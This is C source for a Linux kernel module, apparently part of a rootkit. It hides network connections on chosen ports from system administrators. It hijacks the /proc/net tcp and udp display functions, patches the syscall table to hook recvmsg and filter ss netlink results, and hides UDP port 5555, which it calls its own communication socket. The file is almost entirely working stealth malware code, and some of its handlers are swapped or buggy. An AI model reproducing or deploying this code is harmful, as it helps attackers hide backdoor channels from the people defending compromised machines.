#include "hide_socket.h"
atomic_t in_socket_orig_syscall = ATOMIC_INIT(0);
int udpPorts[10];
int udpNumPorts;
int tcpPorts[10];
int tcpNumPorts;
asmlinkage int (*original_tcp_show) (struct seq_file*, void *);
asmlinkage int (*original_udp_show) (struct seq_file*, void *);
asmlinkage int (*original_tcp6_show) (struct seq_file*, void *);
asmlinkage int (*original_udp6_show) (struct seq_file*, void *);
asmlinkage ssize_t (*original_recvmsg) (int, struct user_msghdr __user *, int);

size_t iov_size(const struct user_msghdr *msg)
{
	size_t i;
	size_t size = 0;

	for (i = 0; i < msg->msg_iovlen; i++)
		size += msg->msg_iov[i].iov_len;
	return size;
}



bool checkTcpPort(int sport, int dport) {
	int i;	
	for(i = 0; i < tcpNumPorts; i++) {
		if(sport == tcpPorts[i] || dport == tcpPorts[i])
			return true;
	}
	return false;
}	

bool checkUdpPort(int sport, int dport) {
	int i;	
	for(i = 0; i < udpNumPorts; i++) {
		if(sport == udpPorts[i] || dport == udpPorts[i])
			return true;
	}
	return false;
}	

asmlinkage int hacked_tcp_show (struct seq_file* sf, void * v)
{
	int ret = 0;
	//struct sock* socket;
	struct inet_sock* inet;
	//struct tcp_inter_state* state;
	//struct inet_request_sock* ireq;
	int sport, dport;
	atomic_inc(&in_socket_orig_syscall); 
	if(SEQ_START_TOKEN == v) {
		DEBUGMSG("Start_token\n");
		atomic_dec(&in_socket_orig_syscall);
		return original_tcp_show(sf,v);
	}

	//state = (struct tcp_inter_state*) sf->private;
	//switch(state->state) {
		//case TCP_SEQ_STATE_LISTENING:
		//case TCP_SEQ_STATE_ESTABLISHED:
			inet = inet_sk((struct sock*) v);//socket);
			sport = ntohs(inet->inet_sport);
			dport = ntohs(inet->inet_dport);
	
			if(checkTcpPort(sport,dport)){
				DEBUGMSG("hidePort: TCP from %d to %d\n", sport, dport);
				atomic_dec(&in_socket_orig_syscall);
				return 0;
			}
			//break;
		//case TCP_SEQ_STATE_OPENREQ:
			//ireq = inet_rsk(v);
			//sport = ntohs(ireq->ir_loc_addr);
			//dport = ntohs(ireq->ir_loc_addr);
	
			//if(checkTcpPort(sport,dport)){
				//DEBUGMSG("Port:TCP openreq from %d to %d\n", sport, dport);
				// return 0
			//}
			//break;
		//default:
			//break;
		//}
	ret = original_tcp_show(sf,v);
	atomic_dec(&in_socket_orig_syscall);
	return ret;
}

asmlinkage int hacked_tcp6_show (struct seq_file* sf, void * v)
{
	int ret = 0;
	struct inet_sock* inet;
	//struct tcp_inter_state* state;
	//struct inet_request_sock* ireq;
	int sport, dport;
	atomic_inc(&in_socket_orig_syscall); 
	if(SEQ_START_TOKEN == v) {
		DEBUGMSG("Start_token\n");
		atomic_dec(&in_socket_orig_syscall);
		return original_tcp_show(sf,v);
	}

	//state = sf->private;
	//switch(state->state) {
		//case TCP_SEQ_STATE_LISTENING:
		//case TCP_SEQ_STATE_ESTABLISHED:
			inet = inet_sk((struct sock*) v);//socket);
			sport = ntohs(inet->inet_sport);
			dport = ntohs(inet->inet_dport);
	
			if(checkTcpPort(sport,dport)){
				DEBUGMSG("hidePort: TCP6 from %d to %d\n", sport, dport);
				atomic_dec(&in_socket_orig_syscall);
				return 0;
			}
			//break;
		//case TCP_SEQ_STATE_OPENREQ:
			//ireq = inet_rsk(v);
			//sport = ntohs(ireq->ir_loc_addr);
			//dport = ntohs(ireq->ir_loc_addr);
	
			//if(checkTcpPort(sport,dport)){
				//DEBUGMSG("Port:TCP6 openreq from %d to %d\n", sport, dport);
				// return 0
			//}
			//break;
		//default:
			//break;
		//}
	ret = original_tcp6_show(sf,v);
	atomic_dec(&in_socket_orig_syscall);
	return ret;
}

asmlinkage int hacked_udp_show (struct seq_file* sf, void * v)
{
	int ret = 0;
	struct inet_sock* inet;
	int sport, dport;
	atomic_inc(&in_socket_orig_syscall); 
	inet = inet_sk((struct sock*) v);
	if(SEQ_START_TOKEN == v) {
		DEBUGMSG("Start_token\n");
		atomic_dec(&in_socket_orig_syscall);
		return original_tcp_show(sf,v);
	}
	sport = ntohs(inet->inet_sport);
	dport = ntohs(inet->inet_dport);

	if(checkUdpPort(sport,dport)){
		DEBUGMSG("hidePort: UDP from %d to %d\n", sport, dport);
		atomic_dec(&in_socket_orig_syscall);
		return 0;
	}
	ret = original_udp_show(sf,v);
	atomic_dec(&in_socket_orig_syscall);
	return ret;
}

asmlinkage int hacked_udp6_show (struct seq_file* sf, void * v)
{
	int ret = 0;
	struct inet_sock* inet;
	int sport, dport;
	atomic_inc(&in_socket_orig_syscall); 
	inet = inet_sk((struct sock*) v);
	if(SEQ_START_TOKEN == v) {
		DEBUGMSG("Start_token\n");
		atomic_dec(&in_socket_orig_syscall);
		return original_tcp_show(sf,v);
	}
	sport = ntohs(inet->inet_sport);
	dport = ntohs(inet->inet_dport);

	if(checkUdpPort(sport,dport)){
		DEBUGMSG("hidePort: UDP6 from %d to %d\n", sport, dport);
		atomic_dec(&in_socket_orig_syscall);
		return 0;
	}
	ret = original_udp6_show(sf,v);
	atomic_dec(&in_socket_orig_syscall);
	return ret;
}

bool checkNlm(struct nlmsghdr* nlm){
	int sport, dport;
	struct inet_diag_msg* msg;
	
	msg	= NLMSG_DATA(nlm);
	sport = ntohs(msg->id.idiag_sport);
	dport = ntohs(msg->id.idiag_dport);
	DEBUGMSG("Port: %d to %d\n", sport, dport);
	return checkUdpPort(sport, dport) || checkTcpPort(sport, dport);
}
/* Hide from ss (like back in the 30s... ) */
asmlinkage ssize_t hacked_recvmsg (int sockfd, struct user_msghdr __user *umsg, int flags)
{
	ssize_t ret = 0;
	long new_remain, remain;
	int sport, dport, err;
	struct socket* sock;
	struct sock* socket;
	struct nlmsghdr __user* uhdr;
	//struct nlmsghdr* hdr;
	struct msghdr msg;
	struct nlmsghdr* next_entry;
	atomic_inc(&in_socket_orig_syscall); 
	
	//DEBUGMSG("RECVMSG: Start\n");
	ret = original_recvmsg(sockfd, umsg, flags);
	sock = sockfd_lookup(sockfd, &err);
	socket = sock->sk;

	if (socket->sk_family == AF_NETLINK && socket->sk_protocol == NETLINK_INET_DIAG) {
		//uhdr = umsg->msg_iov->iov_base;
		//hdr = kmalloc(sizeof(hdr), GFP_KERNEL);		
		//err = copy_from_user(hdr, uhdr, sizeof(hdr));
		remain = ret;
		
		//DEBUGMSG("RECVMSG: in if\n");


		msg.msg_name = umsg->msg_name;
		msg.msg_namelen = umsg->msg_namelen;
		msg.msg_control = umsg->msg_control;
		msg.msg_controllen = umsg->msg_controllen;
		msg.msg_flags = flags;

		iov_iter_init(&msg.msg_iter, READ,
				umsg->msg_iov, umsg->msg_iovlen, iov_size(umsg));




		// Copy data from user space to kernel space
		//msg = kmalloc(ret, GFP_KERNEL);
		//err = copy_from_user(msg, umsg, ret);
		if(msg.msg_iter.iov == NULL){
			DEBUGMSG("Pointer null\n");
			atomic_dec(&in_socket_orig_syscall);	
			return ret;
		}
		//DEBUGMSG("Pointer Not NULL\n");
		struct nlmsghdr* hdr = (struct nlmsghdr*) msg.msg_iter.iov->iov_base; //msg->msg_iov->iov_base;
		//if (err) {
		//	atomic_dec(&in_socket_orig_syscall);	
		//	return ret;
		//}

		// Iterate the entries
		do {
			struct inet_diag_msg* r = NLMSG_DATA(hdr);

			sport = ntohs(r->id.idiag_sport);
			dport = ntohs(r->id.idiag_dport);
			//DEBUGMSG("sport: %d, dport %d\n", sport, dport);
			if (checkTcpPort(sport, dport) || checkUdpPort(sport,dport)) {
				DEBUGMSG("found Port to hide from ss: %d to %d\n", sport,dport);
				// Hide the entry by coping the remaining entries over it
				new_remain = remain;
				next_entry = NLMSG_NEXT(hdr, new_remain);
				memmove(hdr, next_entry, new_remain);

				// Adjust the length variables
				ret -= (remain - new_remain);
				remain = new_remain;
			} else {
				// Nothing to do -> skip this entry
				hdr = NLMSG_NEXT(hdr, remain);
			}
		} while (remain > 0);

		// Copy data back to user space
		//err = copy_to_user(umsg, msg, ret);
		//err = copy_to_user(uhdr, hdr, sizeof(hdr));
		//kfree(msg);
		//kfree(hdr);
		if (err) {
			atomic_dec(&in_socket_orig_syscall);	
			return ret;
		}
	}
	atomic_dec(&in_socket_orig_syscall);	
	return ret;
}

int init_hide_socket(void)
{	
	int i;
	struct proc_dir_entry *proc_subdir;
	struct proc_dir_entry *n;
	struct tcp_seq_afinfo *tcp_seq = 0;
	struct udp_seq_afinfo *udp_seq = 0;

	DEBUGMSG("inserting...\n");
		// hide our comunication socket
	udpPorts[udpNumPorts] = 5555;
	udpNumPorts++;

	DEBUGMSG("udpNumPorts: %d tcpNumPorts: %d\n",udpNumPorts, tcpNumPorts);
	for(i = 0; i<udpNumPorts; i++) {
		DEBUGMSG("Socket to be hidden: %d - UDP\n",udpPorts[i]);
	}
	for(i = 0; i<tcpNumPorts; i++) {
		DEBUGMSG("Socket to be hidden: %d - TCP\n",tcpPorts[i]);
	}
		// inserting hook for netstat hiding	
/*
	proc = init_net.proc_net;//->subdir;

	DEBUGMSG("procent: %s\n", proc->name);
	struct rb_node* nextrb = rb_first(&proc->subdir);
	proc_subdir = rb_entry_safe(nextrb, struct proc_dir_entry, subdir_node); 
*/

	 rbtree_postorder_for_each_entry_safe(proc_subdir, n, &init_net.proc_net->subdir, subdir_node) {

			// found dir tcp or tcp6
		if(strcmp(proc_subdir->name, "tcp")==0 ) {
			DEBUGMSG("Insert: Found tcp dir: %s\n", proc_subdir->name);
			tcp_seq = proc_subdir->data;
			original_tcp_show = tcp_seq->seq_ops.show;
			tcp_seq->seq_ops.show = hacked_tcp_show;
		}
		else if( strcmp(proc_subdir->name, "tcp6")==0 ) {
			DEBUGMSG("Insert: Found tcp dir: %s\n", proc_subdir->name);
			tcp_seq = proc_subdir->data;
			original_tcp6_show = tcp_seq->seq_ops.show;
			tcp_seq->seq_ops.show = hacked_tcp6_show;
		}
			// found dir udp or udp6
		else if(strcmp(proc_subdir->name, "udp6")==0) {
			DEBUGMSG("Insert: Found udp dir: %s\n", proc_subdir->name);
			udp_seq = proc_subdir->data;
			original_udp_show = udp_seq->seq_ops.show;
			udp_seq->seq_ops.show = hacked_udp_show;
		}
		else if(strcmp(proc_subdir->name, "udp")==0 ) {
			DEBUGMSG("Insert: Found udp dir: %s\n", proc_subdir->name);
			udp_seq = proc_subdir->data;
			original_udp6_show = udp_seq->seq_ops.show;
			udp_seq->seq_ops.show = hacked_udp6_show;
		}
	}

		// Insert Hook for recvmsg (used by ss to find sockets)
	make_rw((unsigned long)sys_call_table);
	original_recvmsg = (void*)*(sys_call_table + __NR_recvmsg);
	*(sys_call_table + __NR_recvmsg) = (unsigned long)hacked_recvmsg;
	make_ro((unsigned long)sys_call_table);
	DEBUGMSG("Hock is running; sockets should be hidden\n");
	return 0;
}

void exit_hide_socket(void)
{
	struct proc_dir_entry *proc_subdir;
	struct proc_dir_entry *n;
	struct tcp_seq_afinfo *tcp_seq = 0;
	struct udp_seq_afinfo *udp_seq = 0;
	DEBUGMSG("exiting...\n");

	make_rw((unsigned long)sys_call_table);
	*(sys_call_table + __NR_recvmsg) = (unsigned long)original_recvmsg;
	make_ro((unsigned long)sys_call_table);


	rbtree_postorder_for_each_entry_safe(proc_subdir, n, &init_net.proc_net->subdir, subdir_node) {

		// found dir tcp or tcp6
		if(strcmp(proc_subdir->name, "tcp")==0 ) {
			DEBUGMSG("Removing: dir: %s\n", proc_subdir->name);
			tcp_seq = proc_subdir->data;
			tcp_seq->seq_ops.show = original_tcp_show;
		}
		else if( strcmp(proc_subdir->name, "tcp6")==0 ) {
			DEBUGMSG("Removing: dir: %s\n", proc_subdir->name);
			tcp_seq = proc_subdir->data;
			tcp_seq->seq_ops.show = original_tcp6_show;
		}
		// found dir udp or udp6
		else if(strcmp(proc_subdir->name, "udp6")==0) {
			DEBUGMSG("Removing: dir: %s\n", proc_subdir->name);
			udp_seq = proc_subdir->data;
			udp_seq->seq_ops.show = original_udp_show;
		}
		else if(strcmp(proc_subdir->name, "udp")==0 ) {
			DEBUGMSG("Removing: dir: %s\n", proc_subdir->name);
			udp_seq = proc_subdir->data;
			udp_seq->seq_ops.show = original_udp6_show;
		}
	}

	if(atomic_read(&in_socket_orig_syscall)!=0) 
		DEBUGMSG("waiting for instance to be finished %d\n",atomic_read(&in_socket_orig_syscall));
	while(atomic_read(&in_socket_orig_syscall)!=0){
		msleep(10);
	}
	DEBUGMSG("done\n");
} 
